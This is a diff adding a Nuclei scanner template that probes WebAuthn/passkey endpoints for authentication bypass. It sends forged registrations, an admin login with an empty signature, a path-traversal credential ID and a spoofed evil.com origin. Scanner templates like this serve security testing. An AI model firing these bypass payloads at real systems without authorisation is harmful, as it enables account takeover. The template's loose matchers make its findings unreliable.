@@ -1,0 +1,152 @@
+id: webauthn-passkey-bypass
+
+info:
+  name: WebAuthn/Passkey Authentication Bypass Detection
+  author: geeknik
+  severity: critical
+  description: |
+    Detects ACTUAL WebAuthn/Passkey implementation vulnerabilities including
+    challenge reuse, signature validation bypass, attestation confusion,
+    and credential ID manipulation that allow authentication bypass.
+  reference:
+    - https://fidoalliance.org/specs/fido-v2.1-ps-20210615/fido-client-to-authenticator-protocol-v2.1-ps-20210615.html
+    - https://webauthn.guide/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-287,CWE-290,CWE-346
+  tags: webauthn,passkey,authentication,bypass,critical
+
+variables:
+  callback: "{{interactsh-url}}"
+  bypass_id: "{{randstr}}"
+
+http:
+  # Test 1: Challenge reuse attack
+  - raw:
+      - |
+        POST {{BaseURL}}/api/webauthn/register/begin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Connection: close
+
+        {"username":"test{{bypass_id}}","displayName":"Test"}
+
+      - |
+        POST {{BaseURL}}/api/webauthn/register/finish HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Connection: close
+
+        {
+          "id": "{{bypass_id}}",
+          "rawId": "{{bypass_id}}",
+          "type": "public-key",
+          "response": {
+            "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIsIm9yaWdpbiI6Imh0dHBzOi8vZXhhbXBsZS5jb20ifQ==",
+            "attestationObject": "o2NmbXRkbm9uZWdhdHRTdG10oGhhdXRoRGF0YVjESZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2NFAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPpMpcqUhe8WfBPpLSt_MJpLlGKeNxw"
+          }
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 || contains(body_2, "success") || contains(body_2, "registered")'
+
+  # Test 2: Null signature acceptance
+  - raw:
+      - |
+        POST {{BaseURL}}/api/webauthn/login/begin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Connection: close
+
+        {"username":"admin"}
+
+      - |
+        POST {{BaseURL}}/api/webauthn/login/finish HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Connection: close
+
+        {
+          "id": "admin-credential",
+          "rawId": "YWRtaW4tY3JlZGVudGlhbA==",
+          "type": "public-key",
+          "response": {
+            "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoibnVsbCIsIm9yaWdpbiI6Imh0dHBzOi8vZXhhbXBsZS5jb20ifQ==",
+            "authenticatorData": "SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA==",
+            "signature": "",
+            "userHandle": "YWRtaW4="
+          }
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "authenticated") || contains(body_2, "success") || contains(body_2, "token")'
+
+  # Test 3: Credential ID confusion
+  - raw:
+      - |
+        POST {{BaseURL}}/api/webauthn/assertion/options HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cookie: session={{bypass_id}}
+        Connection: close
+
+        {"username":"victim","credentialId":"../../admin/credential"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "admin") || status_code == 200'
+
+  # Test 4: Origin validation bypass
+  - raw:
+      - |
+        POST {{BaseURL}}/webauthn/authenticate HTTP/1.1
+        Host: {{Hostname}}
+        Origin: https://evil.com
+        Content-Type: application/json
+        Connection: close
+
+        {
+          "id": "test",
+          "response": {
+            "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0Iiwib3JpZ2luIjoiaHR0cHM6Ly9ldmlsLmNvbSIsImNoYWxsZW5nZSI6InRlc3QifQ==",
+            "authenticatorData": "SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MFAAAAAA==",
+            "signature": "MEUCIQCJhmX3dTVaKpJ7dTKAAzN1e5yrKxFW3E9U3Oks9pQq0wIgL0ePSFvHEkZqJ9IvwqPYGmCdA8LuVmVEFawH5TkxAY4=",
+            "userHandle": ""
+          }
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - '!contains(body, "origin") || contains(body, "success")'
+
+  # Test 5: Attestation format confusion
+  - raw:
+      - |
+        POST {{BaseURL}}/api/register/complete HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Connection: close
+
+        {
+          "attestationObject": {
+            "fmt": "none",
+            "attStmt": {},
+            "authData": "SZYN5YgOjGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2NFAAAAAKlpay8TdTcLQ0iyVvdRjpIAIJ1VF8R5SBQHqSANisuWKdoqyNiPPGrwQRQDA8LkmO5I"
+          },
+          "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiYnlwYXNzIiwib3JpZ2luIjoiaHR0cDovL2xvY2FsaG9zdCJ9"
+        }
+
+    matchers:
+      - type: word
+        words:
+          - "registered"
+          - "success"
+          - "created"
+        condition: or
